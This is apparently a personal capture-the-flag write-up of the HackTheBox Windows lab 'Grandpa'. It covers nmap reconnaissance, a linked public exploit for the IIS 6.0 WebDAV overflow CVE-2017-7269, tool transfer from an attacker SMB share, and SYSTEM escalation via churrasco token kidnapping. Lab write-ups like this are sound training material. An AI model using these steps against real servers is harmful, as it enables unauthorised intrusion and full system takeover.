# Grandpa

![grandpa_banner](/assets/img/grandpa/grandpa_banner.png)

[Grandpa](https://app.hackthebox.com/machines/13) is an easy windows machine available on HackTheBox and is the second box I chose in the OSCP learning series. Let's dive into it.

## Reconnaissance

Starting with the usual TCP port scan with `nmap`

```txt
sudo nmap -sS -sV -p- 10.129.95.233 -oA scan/grandpa_scan -vv

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
```

Only the port 80 is open, let's see what is hiding behind the port. 

### HTTP - Port 80

Microsoft IIS web server is confirmed with the message `Enabling and Disabling Dynamic Content" in IIS Help` on the frontpage.

We can run default nmap script on the target to check for potential vuln.

```txt
sudo nmap -sC -p 80 10.129.95.233 -vv  

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Fri, 17 Dec 2021 20:45:29 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
```

Running more aggressive `nmap` script, we find the webserver is using something called `Frontpage`.

```txt
nmap --script=vuln -p 80 10.129.95.233 -vv

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
| http-enum:

|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
```

## Initial Foothold

After searching around an hour for exploits against Frontpage and Microsoft IIS 6.0, an interesting article pops up : [IIS 6.0 Vulnerability Leads to Code Execution](https://www.trendmicro.com/en_us/research/17/c/iis-6-0-vulnerability-leads-code-execution.html).

The article is talking about [CVE-2017-7269](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269), a vulnerability in IIS 6.0 using a buffer overflow to gain remote code execution.

We can find multiple exploit on github, I chose this one (<https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269>)

Running a listener on our host, we execute the exploit and we are in !

## Privilege Escalation

Let's enumerate the system to find information we can use to escalate our privilege.

First we can find general system information with `systeminfo`

```txt

```

The OS is pretty old, it's a `Microsoft Windows Server 2003`. Those information might be useful to use with tools like [Windows Exploit Suggester](https://github.com/bitsadmin/wesng).

We can also check our privileges information.

```txt
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

We can see a very interesting token called `SeImpersonatePrivilege`. This token is used to impersonate a client after authentication. Whenever a user is assigned the `SeImpersontatePrivilege`, the user is permitted to run programs on behalf of that user to impersonate a client.

There are tools we can use like [JuicyPotato](https://github.com/ohpe/juicy-potato) that will exploit this token to escalate to `NT Authority\System`.

In order to run the tool on the target, we first need to upload it there, and transfering files on a Windows machine can sometimes be a bit clumsy.

The first binary we can try is `certutil`. This binary is available natively on Windows machines and its main goal is to manage certificates but pentesters and hackers alike diverted its original use to download malicious files on target. It's called *Living Off The Land*, find more information on the [LOLBAS](https://lolbas-project.github.io) project.

Unfortunately without really knowing why, the `certutil` binary was not downloading the executable on the target.

Lucky for us, there are other ways to upload files. The second method we can use is using the `SMB` protocol.

First we create a SMB share with `impacket-smbserver.py` to make our executable available and we pull the file from the server with `copy \\IP\share\filename`

![grandpa_smb](/assets/img/grandpa/grandpa_smb.png)

The file has successfully been transfered on the target.

We can now run our malicious executable.

```txt
C:\WINDOWS\Temp>JuicyPotato.exe
JuicyPotato.exe
The image file C:\WINDOWS\Temp\JuicyPotato.exe is valid, but is for a machine type other than the current machine.
```

We have a new problem...The executable seems to be incompatible with our target. Remember the OS is an old Windows Server 2003. We have to find a way to exploit this token. Back to online searching !

After searching for specific information related to token and microsoft 2003, an [article](https://msrc-blog.microsoft.com/2009/04/14/ms09-012-fixing-token-kidnapping/) from Microsoft caught my eyes, the article is talking about an attack called *Token Kidnapping*. We can specify our research even more, and...boom ! [Windows Privilege Escalation via Token Kidnapping](https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e)

The tool used is `churrasco.exe`, and can be found [here](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe).

After uploading it on the target using the SMB method. Let's see if it works...and yes it actually did work !

```txt
churrasco.exe -d whoami

nt authority\system
```

We can run the same command but replacing the `whoami` command with `cmd` to gain a shell as `nt autorithy\system` !

We have rooted the box !

## Conclusion

As I'm not used to work with Windows machines, it was a really tough challenge even though the box is considered easy. The fact that the machine was really old caught me off guard.

Hacking this box made me learn alternative ways to transfer file on Windows and showed me that searching for solutions on Internet is a big part of the job and needed to be further improved.
